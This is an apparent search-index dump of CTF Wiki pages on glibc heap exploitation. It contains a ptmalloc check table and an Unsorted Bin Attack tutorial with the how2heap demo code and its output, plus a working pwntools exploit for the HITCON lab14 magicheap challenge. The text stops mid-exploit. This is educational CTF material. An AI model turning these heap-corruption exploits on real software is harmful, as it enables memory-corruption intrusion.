REQUEST_OUT_OF_RANGE(req) \uff1a((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) | __set_errno(ENOMEM) | fastbin \u00b6 Check Target Check Condition Error Message | chunk \u5927\u5c0f | fastbin_index(chunksize(victim)) != idx | malloc(): memory corruption (fast) | Unsorted bin \u00b6 Check Target Check Condition Error Message | unsorted bin chunk \u5927\u5c0f | chunksize_nomask (victim) <= 2 * SIZE_SZ || chunksize_nomask (victim) av->system_mem | malloc(): memory corruption | top chunk \u00b6 Check Objectives Check Conditions Information | top chunk size | (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) | \u65b9\u53ef\u8fdb\u5165 | __libc_free \u00b6 mmap block \u00b6 Check Objectives Check Conditions Information | chunk size tag bit | chunk_is_mmapped (p) | to enter | Non-mmap block \u00b6 __int_free \u00b6 Initial inspection \u00b6 Check Target Check Condition Error Message Release the chunk position | (uintptr_t) p > (uintptr_t) -size || misaligned_chunk(p) | free(): invalid pointer | | \u91ca\u653echunk\u7684\u5927\u5c0f | size < MINSIZE || !aligned_OK(size) | free(): invalid size | fastbin \u00b6 Check Target Check Condition Error Message | Release the next chunk size of the chunk | chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ, chunksize(chunk_at_offset(p, size)) >= av->system_mem | free(): invalid next size (fast) | | Release the first chunk of the chunk corresponding to the linked list | fb = &fastbin(av, idx), old= *fb, old == p | double free or corruption (fasttop) | | fastbin\u7d22\u5f15 | old != NULL && old_idx != idx | invalid fastbin entry (free) | non-mmapped block check \u00b6 Check Target Check Condition Error Message | Free chunk location | p == av->top | double free or corruption (top) | | next chunk \u4f4d\u7f6e | contiguous (av) && (char ) nextchunk >= ((char ) av->top + chunksize(av->top)) | double free or corruption (out) | | next chunk \u5927\u5c0f | chunksize_nomask (nextchunk) <= 2 * SIZE_SZ || nextsize >= av->system_mem | free(): invalid next size (normal) | unlink \u00b6 Check Target Check Condition Error Message | size vs prev_size | chunksize(P) != prev_size (next_chunk(P)) | corrupted size vs. prev_size | | Fd, bk doubly linked list check | FD->bk != P || BK->fd != P | corrupted double-linked list | | nextsize \u53cc\u5411\u94fe\u8868 | P->fd_nextsize->bk_nextsize != P || P->bk_nextsize->fd_nextsize != P | corrupted double-linked list (not small) |","title":"Ptmalloc check"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#in-the-heap","text":"","title":"\u5806 in the heap"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#_int_malloc","text":"","title":"_int_malloc"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#initial-inspection","text":"Check Objectives Check Conditions Information | \u7533\u8bf7\u7684\u5927\u5c0f | REQUEST_OUT_OF_RANGE(req) \uff1a((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) | __set_errno(ENOMEM) |","title":"Initial inspection"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#fastbin","text":"Check Target Check Condition Error Message | chunk \u5927\u5c0f | fastbin_index(chunksize(victim)) != idx | malloc(): memory corruption (fast) |","title":"fastbin"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#unsorted-bin","text":"Check Target Check Condition Error Message | unsorted bin chunk \u5927\u5c0f | chunksize_nomask (victim) <= 2 * SIZE_SZ || chunksize_nomask (victim) av->system_mem | malloc(): memory corruption |","title":"Unsorted bin"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#top-chunk","text":"Check Objectives Check Conditions Information | top chunk size | (unsigned long) (size) >= (unsigned long) (nb + MINSIZE) | \u65b9\u53ef\u8fdb\u5165 |","title":"top chunk"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#__libc_free","text":"","title":"__libc_free"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#mmap-block","text":"Check Objectives Check Conditions Information | chunk size tag bit | chunk_is_mmapped (p) | to enter |","title":"mmap block"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#non-mmap-block","text":"","title":"Non-mmap block"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#__int_free","text":"","title":"__int_free"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#initial-inspection_1","text":"Check Target Check Condition Error Message Release the chunk position | (uintptr_t) p > (uintptr_t) -size || misaligned_chunk(p) | free(): invalid pointer | | \u91ca\u653echunk\u7684\u5927\u5c0f | size < MINSIZE || !aligned_OK(size) | free(): invalid size |","title":"Initial inspection"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#fastbin_1","text":"Check Target Check Condition Error Message | Release the next chunk size of the chunk | chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ, chunksize(chunk_at_offset(p, size)) >= av->system_mem | free(): invalid next size (fast) | | Release the first chunk of the chunk corresponding to the linked list | fb = &fastbin(av, idx), old= *fb, old == p | double free or corruption (fasttop) | | fastbin\u7d22\u5f15 | old != NULL && old_idx != idx | invalid fastbin entry (free) |","title":"fastbin"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#non-mmapped-block-check","text":"Check Target Check Condition Error Message | Free chunk location | p == av->top | double free or corruption (top) | | next chunk \u4f4d\u7f6e | contiguous (av) && (char ) nextchunk >= ((char ) av->top + chunksize(av->top)) | double free or corruption (out) | | next chunk \u5927\u5c0f | chunksize_nomask (nextchunk) <= 2 * SIZE_SZ || nextsize >= av->system_mem | free(): invalid next size (normal) |","title":"non-mmapped block check"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#unlink","text":"Check Target Check Condition Error Message | size vs prev_size | chunksize(P) != prev_size (next_chunk(P)) | corrupted size vs. prev_size | | Fd, bk doubly linked list check | FD->bk != P || BK->fd != P | corrupted double-linked list | | nextsize \u53cc\u5411\u94fe\u8868 | P->fd_nextsize->bk_nextsize != P || P->bk_nextsize->fd_nextsize != P | corrupted double-linked list (not small) |","title":"unlink"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/","text":"Unsorted Bin Attack \u00b6 Overview \u00b6 Unsorted Bin Attack, as the name implies, is closely related to the mechanism of Unsorted Bin in Glibc heap management. The premise that Unsorted Bin Attack is exploited is to control the bk pointer of Unsorted Bin Chunk. The effect that Unsorted Bin Attack can achieve is to implement a modification of any address value to a larger value. Unsorted Bin Review \u00b6 Before introducing the Unsorted Bin attack, you can review the basic source and basic usage of Unsorted Bin. Basic source \u00b6 When a large chunk is split into two halves, if the rest is greater than MINSIZE, it will be placed in the unsorted bin. When a chunk that does not belong to the fast bin is released, and the chunk is not in close proximity to the top chunk, the chunk is first placed in the unsorted bin. For an explanation of the top chunk, please refer to the introduction below. When malloc_consolidate is executed, the merged chunk may be placed in the unsorted bin if it is not close to the top chunk. Basic usage \u00b6 Unsorted Bin In the process of using, the traversal order used is FIFO, is inserted into the head of the unsorted bin when it is inserted, and gets from the end of the list when it is taken out. When the program malloc, if the chunk of the corresponding size is not found in the fastbin, small bin, it will try to find the chunk from the Unsorted Bin. If the size of the chunk that is taken out is just enough, it will be returned directly to the user, otherwise the chunks will be inserted into the corresponding bin. Principle \u00b6 In glibc / malloc / malloc.c has such a piece of code that will take the position of bck-&gt;fd when an unsorted bin is taken out. Write to the location of this Unsorted Bin. /* remove from unsorted list */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): corrupted unsorted chunks 3\" ); unsorted_chunks ( off ) -& gt ; bk = bck ; bck -& gt ; fd = unsorted_chunks ( off ); In other words, if we control the value of bk, we can write unsorted_chunks (av) to any address. Here I will take [unsorted_bin_attack.c] ( https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c ) in shellphish's how2heap repository as an example. Here I make some simple modifications, as follows #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack \\n \" ); fprintf ( stderr , \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack \\n\\n \" ); unsigned long target_var = 0 ; fprintf ( stderr , \"Let's first look at the target we want to rewrite on stack: \\n \" ); fprintf ( stderr , \"%p: %ld \\n\\n \" , & target_var , target_var ); unsigned long * p = malloc ( 400 ); fprintf ( stderr , \"Now, we allocate first normal chunk on the heap at: %p \\n \" , p ); fprintf ( stderr , \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free() \\n\\n \" ); malloc ( 500 ); free ( p ); fprintf ( stderr , \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to %p \\n \" , ( void * ) p [ 1 ]); /*------------VULNERABILITY-----------*/ p [ 1 ] = ( unsigned long )( & target_var - 2 ); fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the \" \"victim->bk pointer \\n \" ); fprintf ( stderr , \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p \\n\\n \" , ( void * ) p [ 1 ]); //------------------------------------ malloc ( 400 ); fprintf ( stderr , \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite: \\n \" ); fprintf ( stderr , \"%p: %p \\n \" , & target_var , ( void * ) target_var ); } The effect after the program is executed is \u279c unsorted_bin_attack git: ( master ) \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack \u279c unsorted_bin_attack git: ( master ) \u2717 ./unsorted_bin_attack This file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let 's first look at the target we want to rewrite on stack: 0x7ffe0d232518: 0 Now, we allocate first normal chunk on the heap at: 0x1fce010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 Here we can use a diagram to describe the specific process and the principles behind it. In the initial state The fd and bk of the unsorted bin point to the unsorted bin itself. Execute free(p) Since the size of the released chunk is not in the range of the fast bin, it is first placed in the unsorted bin. Modify p[1] After modification, the bk pointer of p in the unsorted bin will point to the fake chunk at target addr-16, that is, the Target Value is at the fd of the fake chunk. Request a 400-size chunk At this point, the requested chunk is in the range of the small bin, and there is no chunk in the corresponding bin, so it will go to the unsorted bin and find that the unsorted bin is not empty, so the last chunk in the unsorted bin is taken out. while (( victim = unsorted_chunks ( off ) -& gt ; bk ) ! = unsorted_chunks ( off )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), off ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ /* Obviously, bck has been modified and does not meet the requirements here*/ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == off -& gt ; last_remainder & amp ; & amp ; ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { .... } /* remove from unsorted list */ unsorted_chunks ( off ) -& gt ; bk = bck ; bck -& gt ; fd = unsorted_chunks ( off ); victim = unsorted_chunks (off) -> bk = p bck = victim->bk=p->bk = target addr-16 unsorted_chunks(av)->bk = bck=target addr-16 bck->fd = *(target addr -16+16) = unsorted_chunks(av); It can be seen that in the process of taking the last chunk of the unsorted bin, the victim's fd does not work, so even if we modify it to an illegal value, it does not matter. However, it should be noted that the unsorted bin list may be destroyed, and problems may occur when inserting chunks. That is, the value of the target is changed to the linked table header 0x7f1c705ffb78 of the unsorted bin, which is the previously output information. We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 ( in 32 -bits machine, it should be target address-8 ) :0x7ffe0d232508 Let ' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 Here we can see that the unsorted bin attack can indeed modify the value of any address, but the value modified is not controlled by us. The only thing we can know is that this value is relatively large. And, it\u2019s important to note that This doesn't seem to be useful, but it's still a bit of an egg, for example We can make the program execute multiple loops by modifying the number of loops. We can modify the global_max_fast in the heap to make the larger chunks look like fast bins, so we can perform some fast bin attacks. HITCON Training lab14 magic heap \u00b6 [Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14 ) Here we modify the l33t function in the source program so that it can run normally. void l33t () { system ( \"cat ./flag\" ); } Basic Information \u00b6 \u279c hitcontraining_lab14 git: ( master ) file magicheap magicheap: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped \u279c hitcontraining_lab14 git: ( master ) checksec magicheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program is a dynamically linked 64 program, which mainly opens NX protection and Canary protection. basic skills \u00b6 The program is probably the heap manager that I wrote myself. It mainly has the following functions. Create a heap. The corresponding heap is requested according to the user-specified size, and the content of the specified length is read, but NULL is not set. Edit the heap. According to the specified index, it is judged whether the corresponding heap is non-empty. If it is not empty, the content of the heap is modified according to the size read by the user. Here, a vulnerability of any length heap overflow occurs. Delete the heap. Determine whether the corresponding heap is non-empty according to the specified index. If it is not empty, release the corresponding heap and set it to NULL. At the same time, we see that when we control v3 to 4869 and control magic to be greater than 4869, we can get the flag. Use \u00b6 Obviously, we can use the unsorted bin attack directly. Release a heap to the unsorted bin. Use the heap overflow vulnerability to modify the bk pointer of the corresponding heap block in the unsorted bin to &magic-16. Trigger the vulnerability. code show as below #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './magicheap' ) def create_heap ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def edit_heap ( idx , size , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def del_heap ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) create_heap ( 0x20 , \"dada\" ) # 0 create_heap ( 0x80 , \"dada\" ) # 1 # in order not to merge into top chunk create_heap ( 0x20 , \"dada\" ) # 2 del_heap ( 1 ) magic = 0x6020c0 fd = 0 bk = magic - 0x10 edit_heap ( 0 , 0x20 + 0x20 , \"a\" * 0x20 + p64 ( 0 ) + p64 ( 0x91 ) + p64 ( fd ) + p64 ( bk )) create_heap ( 0x80 , \"dada\" ) #trigger unsorted bin attack r . recvuntil ( \":\" ) r . sendline ( \"4869\" ) r . interactive () 2016 0CTF zerostorage-To be completed \u00b6 Note: To be completed further. Here we introduce the [zerostorage] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/zerostorage ) of 0CTF 2016 as an example. This question was given to the server version and kernel version of the server, so I can debug it exactly the next time. Here we will debug directly with our local machine. However, in the current Ubuntu 16.04, due to further randomization, the relative offset between the location where libc is loaded and the location where the program module is loaded is no longer fixed, so the strategy of BriefX cannot be used again. It seems that only angelboy can be used. Strategy. Security check \u00b6 It can be seen that the program has opened all protections. pwndbg> checksec [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Basic function analysis \u00b6 The program manages the storage space in the bss segment, with the functions of insert, delete, merge, delete, view, enumerate, and exit. The structure of this storage is as follows 00000000 Storage struc ; (sizeof=0x18, mappedto_7) 00000000 ; XREF: .bss:storage_list/r 00000000 use dq ? 00000008 size dq ? 00000010 xor_addr dq ? 00000018 Storage ends insert-1 \u00b6 The basic functions are as follows Look at the storage array one by one to find the first unused element, but this array is up to 32. The length of the content that needs to be stored to read the storage element. If the length is not greater than 0, exit directly; Otherwise, if the number of bytes requested is less than 128, it is set to 128; Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value; Otherwise, set to 4096. Use calloc to assign the specified length. Note that calloc will initialize chunk to 0. Suppress the memory address assigned by the calloc with a memory of the bss segment (the initial time is a random number) to get a new memory address. Read in the content according to the size of the stored storage. Save the size of the corresponding storage and the address of the stored content to the corresponding storage element and mark the element as available. However, it should be noted that the size of the storage recorded here is the size of your own input! ! ! Increment the number of storage num. update-2 \u00b6 If there is no storage, return directly. Read the id of the storage element to be updated. If the id is greater than 31 or is currently not in use, the description is incorrect and returns directly. Read the length of the content that the storage element needs to store after the update. If the length is not greater than 0, exit directly; Otherwise, if the number of bytes requested is less than 128, it is set to 128; Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value; Otherwise, set to 4096. Obtain the address of the original storage content according to the random number corresponding to the bss segment. If the length required after the update is not equal to the length before the update, use realloc to reassign the memory. Read the data again and update the storage element. merge-3 \u00b6 If the element being used is no more than one, then you cannot merge and you can exit directly. Determine if the storage is full. If it is not full, find the free one. Read the id of merge_from and the id number of merge_to, respectively, and detect the corresponding size and usage status. Calculate the space required for the two merges together based on the size of the initial user input. If it is not greater than 128, then it will not apply for a new space , otherwise apply for a new space of the corresponding size. Copy the contents of merge_to and merge_from to the corresponding location. The memory address of the last stored merge_from content was released, but was not set to NULL. At the same time, the memory address for storing the merge_to content is not released, and the corresponding storage address or the subsequent address is only set to NULL. ** But it should be noted that, at the time of merge, it is not detected whether the IDs of the two storages are the same. delete-4 \u00b6 If no elements are stored, return directly. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly. If the corresponding element of storage is not in use, it will also return. After that, the fields corresponding to the elements are set to NULL and the corresponding memory is released. view-5 \u00b6 If no elements are stored, return directly. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly. If the corresponding element of storage is not in use, it will also return. Enter the contents of the corresponding storage. list-6 \u00b6 If no elements are stored, return directly. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly. Traverse all the storages in use, enter their corresponding subscripts and the size of the corresponding storage. Vulnerability determination \u00b6 Through such a simple analysis, we can basically determine that the vulnerability is mainly concentrated in the insert operation and the merge operation, especially when we merge two smaller size storage, there will be some problems. Let's take a detailed analysis. If we insert a smaller size (such as 8) storage A in the insert process, then when we merge, let's say that we select the two storages of merge are A, then the program will Directly, the content of A will be added directly to the original content of A, and then the memory of the corresponding data portion of A will be freed, but this does not have any effect, because the address of A storage content is Assigned to another storage, when accessing the contents of the storage B part of the merge, since the address of the stored data part of B is actually the address of the stored data corresponding to A, the content of the data part of A is printed. However, we just released the memory corresponding to A, and A is not in the fast bin range, so it will only be placed in the unsorted bin (and only one at this time), so the fd and bk of A are stored at this time. Is a base address of the unsorted bin. If we have deleted a storage C before the merge, then after we merge A, A will be inserted in the header of the unsorted bin's doubly linked list, so its fd is the address corresponding to C, and bk is a base of unsorted bin. address. This way we can directly leak two addresses. And it should be noted that we can still modify the content of B after the merge, so this is actually a Use After Free. Utilization process \u00b6 Unsorted Bin Attack Use the unsorted bin attack to modify the global_max_fast global variable. Since the global_max_fast variable is the size of the largest Fast chunk, it is rewritten as the address of the unsorted bin (generally a large positive number), so that the subsequent chunks can be made. Being used as a fast chunk, you can do a Fast bin attack. Fast Bin Attack topic \u00b6 references \u00b6 http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/ https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py","title":"Unsorted Bin Attack"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#unsorted-bin-attack","text":"","title":"Unsorted Bin Attack"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#overview","text":"Unsorted Bin Attack, as the name implies, is closely related to the mechanism of Unsorted Bin in Glibc heap management. The premise that Unsorted Bin Attack is exploited is to control the bk pointer of Unsorted Bin Chunk. The effect that Unsorted Bin Attack can achieve is to implement a modification of any address value to a larger value.","title":"Overview"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#unsorted-bin-review","text":"Before introducing the Unsorted Bin attack, you can review the basic source and basic usage of Unsorted Bin.","title":"Unsorted Bin Review"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-source","text":"When a large chunk is split into two halves, if the rest is greater than MINSIZE, it will be placed in the unsorted bin. When a chunk that does not belong to the fast bin is released, and the chunk is not in close proximity to the top chunk, the chunk is first placed in the unsorted bin. For an explanation of the top chunk, please refer to the introduction below. When malloc_consolidate is executed, the merged chunk may be placed in the unsorted bin if it is not close to the top chunk.","title":"Basic source"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-usage","text":"Unsorted Bin In the process of using, the traversal order used is FIFO, is inserted into the head of the unsorted bin when it is inserted, and gets from the end of the list when it is taken out. When the program malloc, if the chunk of the corresponding size is not found in the fastbin, small bin, it will try to find the chunk from the Unsorted Bin. If the size of the chunk that is taken out is just enough, it will be returned directly to the user, otherwise the chunks will be inserted into the corresponding bin.","title":"Basic usage"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#principle","text":"In glibc / malloc / malloc.c has such a piece of code that will take the position of bck-&gt;fd when an unsorted bin is taken out. Write to the location of this Unsorted Bin. /* remove from unsorted list */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): corrupted unsorted chunks 3\" ); unsorted_chunks ( off ) -& gt ; bk = bck ; bck -& gt ; fd = unsorted_chunks ( off ); In other words, if we control the value of bk, we can write unsorted_chunks (av) to any address. Here I will take [unsorted_bin_attack.c] ( https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c ) in shellphish's how2heap repository as an example. Here I make some simple modifications, as follows #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack \\n \" ); fprintf ( stderr , \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack \\n\\n \" ); unsigned long target_var = 0 ; fprintf ( stderr , \"Let's first look at the target we want to rewrite on stack: \\n \" ); fprintf ( stderr , \"%p: %ld \\n\\n \" , & target_var , target_var ); unsigned long * p = malloc ( 400 ); fprintf ( stderr , \"Now, we allocate first normal chunk on the heap at: %p \\n \" , p ); fprintf ( stderr , \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free() \\n\\n \" ); malloc ( 500 ); free ( p ); fprintf ( stderr , \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to %p \\n \" , ( void * ) p [ 1 ]); /*------------VULNERABILITY-----------*/ p [ 1 ] = ( unsigned long )( & target_var - 2 ); fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the \" \"victim->bk pointer \\n \" ); fprintf ( stderr , \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p \\n\\n \" , ( void * ) p [ 1 ]); //------------------------------------ malloc ( 400 ); fprintf ( stderr , \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite: \\n \" ); fprintf ( stderr , \"%p: %p \\n \" , & target_var , ( void * ) target_var ); } The effect after the program is executed is \u279c unsorted_bin_attack git: ( master ) \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack \u279c unsorted_bin_attack git: ( master ) \u2717 ./unsorted_bin_attack This file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let 's first look at the target we want to rewrite on stack: 0x7ffe0d232518: 0 Now, we allocate first normal chunk on the heap at: 0x1fce010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 Here we can use a diagram to describe the specific process and the principles behind it. In the initial state The fd and bk of the unsorted bin point to the unsorted bin itself. Execute free(p) Since the size of the released chunk is not in the range of the fast bin, it is first placed in the unsorted bin. Modify p[1] After modification, the bk pointer of p in the unsorted bin will point to the fake chunk at target addr-16, that is, the Target Value is at the fd of the fake chunk. Request a 400-size chunk At this point, the requested chunk is in the range of the small bin, and there is no chunk in the corresponding bin, so it will go to the unsorted bin and find that the unsorted bin is not empty, so the last chunk in the unsorted bin is taken out. while (( victim = unsorted_chunks ( off ) -& gt ; bk ) ! = unsorted_chunks ( off )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), off ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ /* Obviously, bck has been modified and does not meet the requirements here*/ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == off -& gt ; last_remainder & amp ; & amp ; ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { .... } /* remove from unsorted list */ unsorted_chunks ( off ) -& gt ; bk = bck ; bck -& gt ; fd = unsorted_chunks ( off ); victim = unsorted_chunks (off) -> bk = p bck = victim->bk=p->bk = target addr-16 unsorted_chunks(av)->bk = bck=target addr-16 bck->fd = *(target addr -16+16) = unsorted_chunks(av); It can be seen that in the process of taking the last chunk of the unsorted bin, the victim's fd does not work, so even if we modify it to an illegal value, it does not matter. However, it should be noted that the unsorted bin list may be destroyed, and problems may occur when inserting chunks. That is, the value of the target is changed to the linked table header 0x7f1c705ffb78 of the unsorted bin, which is the previously output information. We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 ( in 32 -bits machine, it should be target address-8 ) :0x7ffe0d232508 Let ' s malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 Here we can see that the unsorted bin attack can indeed modify the value of any address, but the value modified is not controlled by us. The only thing we can know is that this value is relatively large. And, it\u2019s important to note that This doesn't seem to be useful, but it's still a bit of an egg, for example We can make the program execute multiple loops by modifying the number of loops. We can modify the global_max_fast in the heap to make the larger chunks look like fast bins, so we can perform some fast bin attacks.","title":"Principle"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#hitcon-training-lab14-magic-heap","text":"[Topic link] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14 ) Here we modify the l33t function in the source program so that it can run normally. void l33t () { system ( \"cat ./flag\" ); }","title":"HITCON Training lab14 magic heap"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-information","text":"\u279c hitcontraining_lab14 git: ( master ) file magicheap magicheap: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped \u279c hitcontraining_lab14 git: ( master ) checksec magicheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program is a dynamically linked 64 program, which mainly opens NX protection and Canary protection.","title":"Basic Information"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-skills","text":"The program is probably the heap manager that I wrote myself. It mainly has the following functions. Create a heap. The corresponding heap is requested according to the user-specified size, and the content of the specified length is read, but NULL is not set. Edit the heap. According to the specified index, it is judged whether the corresponding heap is non-empty. If it is not empty, the content of the heap is modified according to the size read by the user. Here, a vulnerability of any length heap overflow occurs. Delete the heap. Determine whether the corresponding heap is non-empty according to the specified index. If it is not empty, release the corresponding heap and set it to NULL. At the same time, we see that when we control v3 to 4869 and control magic to be greater than 4869, we can get the flag.","title":"basic skills"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#use","text":"Obviously, we can use the unsorted bin attack directly. Release a heap to the unsorted bin. Use the heap overflow vulnerability to modify the bk pointer of the corresponding heap block in the unsorted bin to &magic-16. Trigger the vulnerability. code show as below #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './magicheap' ) def create_heap ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def 